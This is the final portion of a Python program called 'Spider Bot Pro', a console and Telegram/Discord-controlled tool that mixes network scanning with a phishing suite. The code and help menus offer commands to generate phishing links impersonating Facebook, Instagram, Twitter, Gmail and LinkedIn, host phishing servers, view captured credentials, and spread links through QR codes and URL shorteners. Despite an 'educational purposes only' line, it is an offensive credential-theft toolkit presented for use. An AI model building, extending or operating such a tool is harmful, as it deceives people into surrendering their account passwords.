            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    async def start(self):
        """Start Telegram bot"""
        if not TELETHON_AVAILABLE:
            logger.error("Telethon not installed")
            return False
        
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            logger.error("Telegram API credentials not configured")
            return False
        
        try:
            self.client = TelegramClient(
                'spiderbot_session',
                self.config['api_id'],
                self.config['api_hash']
            )
            
            # Event handler for incoming messages
            @self.client.on(events.NewMessage(pattern=r'^/(start|help|ping|scan|quick_scan|nmap|whois|dns|location|system|status|threats|report|phishing_facebook|phishing_instagram|phishing_custom|phishing_start|phishing_stop|phishing_status|phishing_links|phishing_credentials|phishing_qr|phishing_shorten)'))
            async def handler(event):
                await self.handle_command(event)
            
            await self.client.start(phone=self.config.get('phone_number', ''))
            logger.info("Telegram bot started")
            print(f"{Colors.GREEN}✅ Telegram bot connected{Colors.RESET}")
            
            self.running = True
            
            # Keep running
            await self.client.run_until_disconnected()
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Telegram bot: {e}")
            return False
    
    async def handle_command(self, event):
        """Handle Telegram commands"""
        message = event.message.message
        sender = await event.get_sender()
        
        if not message.startswith('/'):
            return
        
        command_parts = message.split()
        command = command_parts[0][1:]  # Remove '/'
        args = command_parts[1:] if len(command_parts) > 1 else []
        
        logger.info(f"Telegram command from {sender.username}: {command} {args}")
        
        # Map Telegram commands to handler commands
        cmd_map = {
            'start': 'help',
            'help': 'help',
            'ping': f"ping {' '.join(args)}",
            'scan': f"scan {' '.join(args)}",
            'quick_scan': f"quick_scan {' '.join(args)}",
            'nmap': f"nmap {' '.join(args)}",
            'whois': f"whois {' '.join(args)}",
            'dns': f"dns {' '.join(args)}",
            'location': f"location {' '.join(args)}",
            'system': 'system',
            'status': 'status',
            'threats': 'threats',
            'report': 'report',
            'phishing_facebook': 'generate_phishing_link_for_facebook',
            'phishing_instagram': 'generate_phishing_link_for_instagram',
            'phishing_custom': f"generate_phishing_link_for_custom {' '.join(args)}" if args else 'generate_phishing_link_for_custom',
            'phishing_start': f"phishing_start_server {' '.join(args)}" if args else 'phishing_start_server',
            'phishing_stop': 'phishing_stop_server',
            'phishing_status': 'phishing_status',
            'phishing_links': 'phishing_links',
            'phishing_credentials': f"phishing_credentials {' '.join(args)}" if args else 'phishing_credentials',
            'phishing_qr': f"phishing_qr {' '.join(args)}" if args else 'phishing_qr',
            'phishing_shorten': f"phishing_shorten {' '.join(args)}" if args else 'phishing_shorten'
        }
        
        if command in cmd_map:
            handler_cmd = cmd_map[command]
            if command in ['start', 'help']:
                await self.send_help(event)
            else:
                # Send processing message
                processing_msg = await event.reply(f"🔄 Processing {command}...")
                
                # Execute command
                result = self.handler.execute(handler_cmd, "telegram")
                
                # Send result
                await self.send_result(event, result, processing_msg)
    
    async def send_help(self, event):
        """Send help message"""
        help_text = """
🕸️ *Spider Bot Pro v17.0.0 - Telegram Commands*

*/start* - Show this help
*/help* - Show this help

*🛡️ Network Commands:*
`/ping <ip>` - Ping an IP address
`/scan <ip>` - Scan ports 1-1000
`/quick_scan <ip>` - Quick port scan
`/nmap <ip> [options]` - Full nmap scan
`/traceroute <target>` - Network path tracing

*🔍 Information Gathering:*
`/whois <domain>` - WHOIS lookup
`/dns <domain>` - DNS lookup
`/location <ip>` - IP geolocation

*🎣 Social Engineering:*
`/phishing_facebook` - Generate Facebook phishing link
`/phishing_instagram` - Generate Instagram phishing link
`/phishing_custom [url]` - Generate custom phishing link
`/phishing_start <id> [port]` - Start phishing server
`/phishing_stop` - Stop phishing server
`/phishing_status` - Check server status
`/phishing_links` - List all phishing links
`/phishing_credentials [id]` - View captured credentials
`/phishing_qr <id>` - Generate QR code
`/phishing_shorten <id>` - Shorten URL

*📊 System Commands:*
`/system` - System information
`/status` - System status
`/threats` - Recent threats
`/report` - Security report

*Examples:*
`/ping 8.8.8.8`
`/scan 192.168.1.1`
`/phishing_facebook`
`/phishing_start abc12345 8080`
`/phishing_credentials`

⚠️ *For educational purposes only*
        """
        
        await event.reply(help_text, parse_mode='markdown')
    
    async def send_result(self, event, result: Dict[str, Any], processing_msg=None):
        """Send command result to Telegram"""
        if processing_msg:
            try:
                await processing_msg.delete()
            except:
                pass
        
        if not result['success']:
            error_msg = f"❌ *Command Failed*\n\n```{result.get('output', 'Unknown error')[:1000]}```"
            await event.reply(error_msg, parse_mode='markdown')
            return
        
        output = result.get('output', '') or result.get('data', '')
        
        if isinstance(output, dict):
            try:
                formatted = json.dumps(output, indent=2)
            except:
                formatted = str(output)
        else:
            formatted = str(output)
        
        # Truncate if too long for Telegram
        if len(formatted) > 4000:
            formatted = formatted[:3900] + "\n\n... (output truncated)"
        
        success_msg = f"✅ *Command Executed* ({result['execution_time']:.2f}s)\n\n```{formatted}```"
        
        await event.reply(success_msg, parse_mode='markdown')
    
    def start_bot_thread(self):
        """Start Telegram bot in separate thread"""
        if self.config.get('enabled') and self.config.get('api_id'):
            thread = threading.Thread(target=self._run_telegram_bot, daemon=True)
            thread.start()
            logger.info("Telegram bot started in background thread")
            return True
        return False
    
    def _run_telegram_bot(self):
        """Run Telegram bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# MAIN APPLICATION
# =====================
class SpiderBotPro:
    """Main application class"""
    
    def __init__(self):
        # Initialize components
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.handler = CommandHandler(self.db)
        self.monitor = NetworkMonitor(self.db, self.config)
        self.discord_bot = SpiderBotDiscord(self.handler, self.db)
        self.telegram_bot = SpiderBotTelegram(self.handler, self.db)
        
        # Application state
        self.running = True
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        🕸️ SPIDER BOT v17.0.0 🕸️                                          {Colors.RED}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.CYAN}  • 600+ Complete Commands Support    • Discord/Telegram Integration       {Colors.RED}║
║{Colors.CYAN}  • Advanced Network Scanning         • Real-time Threat Detection         {Colors.RED}║
║{Colors.CYAN}  • 🎣 Social Engineering Suite        • Phishing Link Generator           {Colors.RED}║
║{Colors.CYAN}  • Facebook/Instagram/Twitter/Gmail   • Custom Phishing Templates         {Colors.RED}║
║{Colors.CYAN}  • QR Code Generation                 • URL Shortening                    {Colors.RED}║
║{Colors.CYAN}  • Credential Capture & Logging       • Multi-platform Support            {Colors.RED}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}🔒 Features:{Colors.RESET}
  • Ping with advanced options
  • Port scanning (nmap integration)
  • Network path tracing
  • WHOIS and DNS lookups
  • IP geolocation
  • System and network monitoring
  • Threat detection and alerts
  • Security reporting
  • 🎣 *NEW* Social Engineering Suite
    - Generate phishing links for Facebook, Instagram, Twitter, Gmail, LinkedIn
    - Custom phishing templates
    - Host phishing pages locally
    - Capture credentials
    - QR code generation
    - URL shortening
  • Discord & Telegram bot integration

{Colors.YELLOW}💡 Type 'help' for command list{Colors.RESET}
{Colors.YELLOW}📚 Type 'help all' for complete 600+ commands{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        """Print help information"""
        help_text = f"""
{Colors.YELLOW}┌─────────────────{Colors.WHITE} COMMAND REFERENCE {Colors.YELLOW}─────────────────┐{Colors.RESET}

{Colors.GREEN}🛡️  MONITORING COMMANDS:{Colors.RESET}
  start                    - Start threat monitoring
  stop                     - Stop monitoring
  status                   - Show monitoring status
  threats                  - Show recent threats
  report                   - Generate security report
  monitor add <ip>         - Add IP to monitoring
  monitor list             - List monitored IPs

{Colors.GREEN}📡 NETWORK DIAGNOSTICS:{Colors.RESET}
  ping <ip> [options]      - Ping with options
  traceroute <target>      - Network path tracing
  scan <ip> [ports]        - Port scan (1-1000)
  quick_scan <ip>          - Fast port scan
  nmap <ip> [options]      - Advanced nmap scanning
  full_scan <ip>           - Scan all ports

{Colors.GREEN}🔍 INFORMATION GATHERING:{Colors.RESET}
  whois <domain>           - WHOIS lookup
  dns <domain>             - DNS lookup
  location <ip>            - IP geolocation
  analyze <ip>             - Analyze IP threats

{Colors.GREEN}🎣 SOCIAL ENGINEERING COMMANDS:{Colors.RESET}
  generate_phishing_link_for_facebook     - Generate Facebook phishing link
  generate_phishing_link_for_instagram    - Generate Instagram phishing link
  generate_phishing_link_for_twitter      - Generate Twitter phishing link
  generate_phishing_link_for_gmail        - Generate Gmail phishing link
  generate_phishing_link_for_linkedin     - Generate LinkedIn phishing link
  generate_phishing_link_for_custom [url] - Generate custom phishing link
  phishing_start_server <id> [port]       - Start phishing server
  phishing_stop_server                    - Stop phishing server
  phishing_status                         - Check server status
  phishing_links                          - List all phishing links
  phishing_credentials [id]                - View captured credentials
  phishing_qr <id>                        - Generate QR code
  phishing_shorten <id>                    - Shorten URL
  phishing_template list [platform]        - List templates
  phishing_template save <name> <platform> - Save custom template

{Colors.GREEN}🤖 BOT COMMANDS:{Colors.RESET}
  config discord token <token>     - Set Discord token
  config discord channel <id>      - Set channel ID
  config telegram api <id> <hash>  - Set Telegram API
  start_discord                    - Start Discord bot
  start_telegram                   - Start Telegram bot

{Colors.GREEN}📁 SYSTEM COMMANDS:{Colors.RESET}
  system                   - System information
  network                  - Network information
  status                   - System status
  history                  - Command history
  clear                    - Clear screen
  exit                     - Exit tool

{Colors.GREEN}💡 EXAMPLES:{Colors.RESET}
  ping 8.8.8.8
  scan 192.168.1.1
  quick_scan example.com
  generate_phishing_link_for_facebook
  phishing_start_server abc12345 8080
  phishing_credentials
  phishing_qr abc12345
  phishing_shorten abc12345

{Colors.YELLOW}└─────────────────────────────────────────────────────────────────────┘{Colors.RESET}
        """
        print(help_text)
    
    def check_dependencies(self):
        """Check for required dependencies"""
        print(f"\n{Colors.CYAN}🔍 Checking dependencies...{Colors.RESET}")
        
        required_tools = ['ping', 'nmap', 'curl', 'dig', 'traceroute']
        missing = []
        
        for tool in required_tools:
            if shutil.which(tool):
                print(f"{Colors.GREEN}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}⚠️  {tool} not found{Colors.RESET}")
                missing.append(tool)
        
        # Check Python packages
        python_packages = {
            'discord.py': DISCORD_AVAILABLE,
            'telethon': TELETHON_AVAILABLE,
            'python-whois': WHOIS_AVAILABLE,
            'colorama': COLORAMA_AVAILABLE,
            'qrcode': QRCODE_AVAILABLE,
            'pyshorteners': SHORTENER_AVAILABLE
        }
        
        print(f"\n{Colors.CYAN}📦 Python packages:{Colors.RESET}")
        for pkg, available in python_packages.items():
            if available:
                print(f"{Colors.GREEN}✅ {pkg}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}⚠️  {pkg} not installed{Colors.RESET}")
                missing.append(pkg)
        
        if missing:
            print(f"\n{Colors.YELLOW}⚠️  Some tools/packages are missing. Some features may not work properly.{Colors.RESET}")
            print(f"{Colors.WHITE}Install missing tools with:{Colors.RESET}")
            if platform.system().lower() == 'linux':
                print(f"  sudo apt-get install {' '.join([t for t in missing if t in required_tools])}")
            elif platform.system().lower() == 'darwin':
                print(f"  brew install {' '.join([t for t in missing if t in required_tools])}")
            
            print(f"\n{Colors.WHITE}Install Python packages:{Colors.RESET}")
            print(f"  pip install discord.py telethon python-whois colorama qrcode[pil] pyshorteners")
        
        print(f"\n{Colors.GREEN}✅ Dependencies check complete{Colors.RESET}")
    
    def setup_discord(self):
        """Setup Discord bot"""
        print(f"\n{Colors.CYAN}🤖 Discord Bot Setup{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        token = input(f"{Colors.YELLOW}Enter Discord bot token (or press Enter to skip): {Colors.RESET}").strip()
        if not token:
            print(f"{Colors.YELLOW}⚠️  Discord setup skipped{Colors.RESET}")
            return
        
        channel_id = input(f"{Colors.YELLOW}Enter channel ID for notifications (optional): {Colors.RESET}").strip()
        prefix = input(f"{Colors.YELLOW}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
        
        if self.discord_bot.save_config(token, channel_id, True, prefix):
            print(f"{Colors.GREEN}✅ Discord configured!{Colors.RESET}")
            
            # Start Discord bot
            if self.discord_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ Discord bot started! Use '{prefix}help' in Discord{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to start Discord bot{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ Failed to save Discord configuration{Colors.RESET}")
    
    def setup_telegram(self):
        """Setup Telegram bot"""
        print(f"\n{Colors.CYAN}📱 Telegram Bot Setup{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        print(f"{Colors.YELLOW}To create a Telegram bot:{Colors.RESET}")
        print(f"1. Open Telegram and search for @BotFather")
        print(f"2. Send /newbot to create a new bot")
        print(f"3. Follow instructions to get API ID and Hash")
        print()
        
        api_id = input(f"{Colors.YELLOW}Enter API ID (or press Enter to skip): {Colors.RESET}").strip()
        if not api_id:
            print(f"{Colors.YELLOW}⚠️  Telegram setup skipped{Colors.RESET}")
            return
        
        api_hash = input(f"{Colors.YELLOW}Enter API Hash: {Colors.RESET}").strip()
        phone_number = input(f"{Colors.YELLOW}Enter your phone number (with country code, optional): {Colors.RESET}").strip()
        channel_id = input(f"{Colors.YELLOW}Enter channel ID (optional): {Colors.RESET}").strip()
        
        if self.telegram_bot.save_config(api_id, api_hash, phone_number, channel_id, True):
            print(f"{Colors.GREEN}✅ Telegram configured!{Colors.RESET}")
            
            # Start Telegram bot
            if self.telegram_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ Telegram bot started! Use /help in Telegram{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to start Telegram bot{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ Failed to save Telegram configuration{Colors.RESET}")
    
    def process_command(self, command: str):
        """Process user command"""
        if not command.strip():
            return
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        if cmd == 'help':
            self.print_help()
        
        elif cmd == 'start':
            self.monitor.start_monitoring()
            print(f"{Colors.GREEN}✅ Threat monitoring started{Colors.RESET}")
        
        elif cmd == 'stop':
            self.monitor.stop_monitoring()
            print(f"{Colors.YELLOW}🛑 Threat monitoring stopped{Colors.RESET}")
        
        elif cmd == 'status':
            status = self.monitor.get_status()
            print(f"\n{Colors.CYAN}📊 Monitoring Status:{Colors.RESET}")
            print(f"  Active: {'✅ Yes' if status['monitoring'] else '❌ No'}")
            print(f"  Monitored IPs: {status['monitored_ips_count']}")
            
            threats = self.db.get_recent_threats(3)
            if threats:
                print(f"\n{Colors.RED}🚨 Recent Threats:{Colors.RESET}")
                for threat in threats:
                    severity_color = Colors.RED if threat['severity'] == 'high' else Colors.YELLOW
                    print(f"  {severity_color}{threat['threat_type']} from {threat['source_ip']}{Colors.RESET}")
        
        elif cmd == 'threats':
            threats = self.db.get_recent_threats(10)
            if threats:
                print(f"\n{Colors.RED}🚨 Recent Threats:{Colors.RESET}")
                for threat in threats:
                    severity_color = Colors.RED if threat['severity'] == 'high' else Colors.YELLOW
                    print(f"\n{severity_color}[{threat['timestamp'][:19]}] {threat['threat_type']}{Colors.RESET}")
                    print(f"  Source: {threat['source_ip']}")
                    print(f"  Severity: {threat['severity']}")
                    print(f"  Description: {threat['description']}")
            else:
                print(f"{Colors.GREEN}✅ No recent threats detected{Colors.RESET}")
        
        elif cmd == 'history':
            history = self.db.get_command_history(20)
            if history:
                print(f"\n{Colors.CYAN}📜 Command History:{Colors.RESET}")
                for record in history:
                    status = f"{Colors.GREEN}✅" if record['success'] else f"{Colors.RED}❌"
                    print(f"{status} [{record['source']}] {record['command'][:50]}{Colors.RESET}")
                    print(f"     {record['timestamp'][:19]}")
            else:
                print(f"{Colors.YELLOW}📜 No command history{Colors.RESET}")
        
        elif cmd == 'report':
            result = self.handler.execute("report")
            if result['success']:
                data = result['data']
                print(f"\n{Colors.CYAN}📊 Security Report{Colors.RESET}")
                print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
                print(f"\n{Colors.WHITE}Generated: {data.get('generated_at', '')[:19]}{Colors.RESET}")
                
                stats = data.get('statistics', {})
                print(f"\n{Colors.GREEN}📈 Statistics:{Colors.RESET}")
                print(f"  Total Commands: {stats.get('total_commands', 0)}")
                print(f"  Total Scans: {stats.get('total_scans', 0)}")
                print(f"  Total Threats: {stats.get('total_threats', 0)}")
                
                threats = data.get('threat_summary', {})
                print(f"\n{Colors.RED}🚨 Threat Summary:{Colors.RESET}")
                print(f"  High: {threats.get('high', 0)}")
                print(f"  Medium: {threats.get('medium', 0)}")
                print(f"  Low: {threats.get('low', 0)}")
                
                se = data.get('social_engineering', {})
                print(f"\n{Colors.MAGENTA}🎣 Social Engineering:{Colors.RESET}")
                print(f"  Active Phishing Links: {se.get('active_links', 0)}")
                print(f"  Total Phishing Links: {se.get('total_phishing_links', 0)}")
                print(f"  Captured Credentials: {se.get('total_captured_credentials', 0)}")
                
                if 'report_file' in data:
                    print(f"\n{Colors.GREEN}✅ Report saved: {data['report_file']}{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to generate report: {result.get('output', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'config' and len(args) >= 2:
            service = args[0].lower()
            
            if service == 'discord':
                if len(args) >= 3 and args[1] == 'token':
                    token = args[2]
                    channel = self.discord_bot.config.get('channel_id', '')
                    prefix = self.discord_bot.config.get('prefix', '!')
                    self.discord_bot.save_config(token, channel, True, prefix)
                    print(f"{Colors.GREEN}✅ Discord token configured{Colors.RESET}")
                
                elif len(args) >= 3 and args[1] == 'channel':
                    channel_id = args[2]
                    token = self.discord_bot.config.get('token', '')
                    prefix = self.discord_bot.config.get('prefix', '!')
                    self.discord_bot.save_config(token, channel_id, True, prefix)
                    print(f"{Colors.GREEN}✅ Discord channel ID configured{Colors.RESET}")
                
                elif len(args) >= 3 and args[1] == 'prefix':
                    prefix = args[2]
                    token = self.discord_bot.config.get('token', '')
                    channel = self.discord_bot.config.get('channel_id', '')
                    self.discord_bot.save_config(token, channel, True, prefix)
                    print(f"{Colors.GREEN}✅ Discord prefix configured to '{prefix}'{Colors.RESET}")
            
            elif service == 'telegram' and len(args) >= 4 and args[1] == 'api':
                api_id = args[2]
                api_hash = args[3]
                phone = self.telegram_bot.config.get('phone_number', '')
                channel = self.telegram_bot.config.get('channel_id', '')
                self.telegram_bot.save_config(api_id, api_hash, phone, channel, True)
                print(f"{Colors.GREEN}✅ Telegram API configured{Colors.RESET}")
        
        elif cmd == 'start_discord':
            if not self.discord_bot.config.get('token'):
                print(f"{Colors.RED}❌ Discord token not configured{Colors.RESET}")
                print(f"{Colors.YELLOW}Use: config discord token <your_token>{Colors.RESET}")
            else:
                if self.discord_bot.start_bot_thread():
                    print(f"{Colors.GREEN}✅ Discord bot started!{Colors.RESET}")
                else:
                    print(f"{Colors.RED}❌ Failed to start Discord bot{Colors.RESET}")
        
        elif cmd == 'start_telegram':
            if not self.telegram_bot.config.get('api_id'):
                print(f"{Colors.RED}❌ Telegram API not configured{Colors.RESET}")
                print(f"{Colors.YELLOW}Use: config telegram api <id> <hash>{Colors.RESET}")
            else:
                if self.telegram_bot.start_bot_thread():
                    print(f"{Colors.GREEN}✅ Telegram bot started!{Colors.RESET}")
                else:
                    print(f"{Colors.RED}❌ Failed to start Telegram bot{Colors.RESET}")
        
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        
        elif cmd == 'exit':
            self.running = False
            print(f"\n{Colors.YELLOW}👋 Thank you for using 3vil Spid3r Bot v17.0.0!{Colors.RESET}")
        
        else:
            # Execute as generic command
            result = self.handler.execute(command)
            if result['success']:
                output = result.get('output', '') or result.get('data', '')
                
                if isinstance(output, dict):
                    # Pretty print dictionaries
                    print(json.dumps(output, indent=2))
                else:
                    print(output)
                
                print(f"\n{Colors.GREEN}✅ Command executed ({result['execution_time']:.2f}s){Colors.RESET}")
            else:
                print(f"\n{Colors.RED}❌ Command failed: {result.get('output', 'Unknown error')}{Colors.RESET}")
    
    def run(self):
        """Main application loop"""
        # Clear screen and show banner
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Check dependencies
        self.check_dependencies()
        
        # Setup bots if configured
        print(f"\n{Colors.CYAN}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        # Check Discord
        if self.discord_bot.config.get('enabled') and self.discord_bot.config.get('token'):
            print(f"{Colors.GREEN}✅ Discord bot configured{Colors.RESET}")
            self.discord_bot.start_bot_thread()
        else:
            setup_discord = input(f"{Colors.YELLOW}Setup Discord bot? (y/n): {Colors.RESET}").strip().lower()
            if setup_discord == 'y':
                self.setup_discord()
        
        # Check Telegram
        if self.telegram_bot.config.get('enabled') and self.telegram_bot.config.get('api_id'):
            print(f"{Colors.GREEN}✅ Telegram bot configured{Colors.RESET}")
            self.telegram_bot.start_bot_thread()
        else:
            setup_telegram = input(f"{Colors.YELLOW}Setup Telegram bot? (y/n): {Colors.RESET}").strip().lower()
            if setup_telegram == 'y':
                self.setup_telegram()
        
        # Ask about monitoring
        auto_monitor = input(f"\n{Colors.YELLOW}Start threat monitoring automatically? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            self.monitor.start_monitoring()
            print(f"{Colors.GREEN}✅ Threat monitoring started{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}✅ Tool ready! Type 'help' for commands.{Colors.RESET}")
        
        # Main command loop
        while self.running:
            try:
                prompt = f"{Colors.RED}[{Colors.WHITE}spiderbot-pro{Colors.RED}]{Colors.RESET} "
                command = input(prompt).strip()
                self.process_command(command)
            
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 Exiting...{Colors.RESET}")
                self.running = False
            
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {str(e)}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.monitor.stop_monitoring()
        if hasattr(self.handler.social_tools, 'phishing_server') and self.handler.social_tools.phishing_server.running:
            self.handler.social_tools.stop_phishing_server()
        self.db.close()
        
        print(f"\n{Colors.GREEN}✅ Tool shutdown complete.{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Logs saved to: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.CYAN}💾 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.CYAN}🎣 Phishing data: {PHISHING_DIR}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.CYAN}🚀 Starting Spider Bot Pro v17.0.0...{Colors.RESET}")
        
        # Check Python version
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7 or higher is required{Colors.RESET}")
            sys.exit(1)
        
        # Create and run application
        app = SpiderBotPro()
        app.run()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {str(e)}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()